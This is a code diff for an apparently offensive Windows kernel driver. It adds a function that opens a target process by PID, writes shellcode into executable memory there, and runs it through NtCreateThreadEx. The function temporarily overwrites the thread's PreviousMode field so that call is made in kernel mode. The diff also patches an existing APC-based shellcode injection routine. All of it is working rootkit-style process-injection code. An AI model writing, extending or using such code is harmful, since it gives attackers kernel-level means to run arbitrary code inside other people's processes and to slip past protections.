@@ -276,6 +276,7 @@ NTSTATUS InjectShellcodeAPC(ShellcodeInformation* ShellcodeInfo) {
 
 	if (!NT_SUCCESS(status))
 		goto CleanUp;
+	shellcodeSize = ShellcodeInfo->ShellcodeSize;
 
 	status = KeWriteProcessMemory(ShellcodeInfo->Shellcode, TargetProcess, shellcodeAddress, shellcodeSize, UserMode);
 
@@ -322,6 +323,75 @@ CleanUp:
 
 	if (hProcess)
 		ZwClose(hProcess);
+
+	return status;
+}
+
+/*
+* Description:
+* InjectShellcodeThread is responsible to inject a shellcode in a certain usermode process with NtCreateThreadEx.
+*
+* Parameters:
+* @ShellcodeInfo [ShellcodeInformation*] -- All the information regarding the injected shellcode.
+*
+* Returns:
+* @status  [NTSTATUS]		 -- Whether successfuly injected or not.
+*/
+NTSTATUS InjectShellcodeThread(ShellcodeInformation* ShellcodeInfo) {
+	OBJECT_ATTRIBUTES objAttr;
+	CLIENT_ID cid;
+	KAPC_STATE state;
+	HANDLE hProcess = NULL;
+	HANDLE hTargetThread = NULL;
+	PEPROCESS TargetProcess = NULL;
+	PVOID remoteAddress = NULL;
+	SIZE_T shellcodeSize = ShellcodeInfo->ShellcodeSize;
+	HANDLE pid = UlongToHandle(ShellcodeInfo->Pid);
+	NTSTATUS status = PsLookupProcessByProcessId(pid, &TargetProcess);
+
+	if (!NT_SUCCESS(status))
+		goto CleanUp;
+
+	InitializeObjectAttributes(&objAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
+	cid.UniqueProcess = pid;
+	cid.UniqueThread = NULL;
+
+	status = ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &cid);
+
+	if (!NT_SUCCESS(status))
+		goto CleanUp;
+
+	status = ZwAllocateVirtualMemory(hProcess, &remoteAddress, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
+
+	if (!NT_SUCCESS(status))
+		goto CleanUp;
+	shellcodeSize = ShellcodeInfo->ShellcodeSize;
+
+	status = KeWriteProcessMemory(ShellcodeInfo->Shellcode, TargetProcess, remoteAddress, shellcodeSize, UserMode);
+
+	if (!NT_SUCCESS(status))
+		goto CleanUp;
+
+	// Making sure that for the creation the thread has access to kernel addresses and restoring the permissions right after.
+	InitializeObjectAttributes(&objAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
+	PCHAR previousMode = (PCHAR)((PUCHAR)PsGetCurrentThread() + THREAD_PREVIOUSMODE_OFFSET);
+	CHAR tmpPreviousMode = *previousMode;
+	*previousMode = KernelMode;
+	status = NtCreateThreadEx(&hTargetThread, THREAD_ALL_ACCESS, &objAttr, hProcess, (PTHREAD_START_ROUTINE)remoteAddress, NULL, 0, NULL, NULL, NULL, NULL);
+	*previousMode = tmpPreviousMode;
+
+CleanUp:
+	if (hTargetThread)
+		ZwClose(hTargetThread);
+
+	if (!NT_SUCCESS(status) && remoteAddress)
+		ZwFreeVirtualMemory(hProcess, &remoteAddress, &shellcodeSize, MEM_DECOMMIT);
+
+	if (hProcess)
+		ZwClose(hProcess);
+
+	if (TargetProcess)
+		ObDereferenceObject(TargetProcess);
 
 	return status;
 }
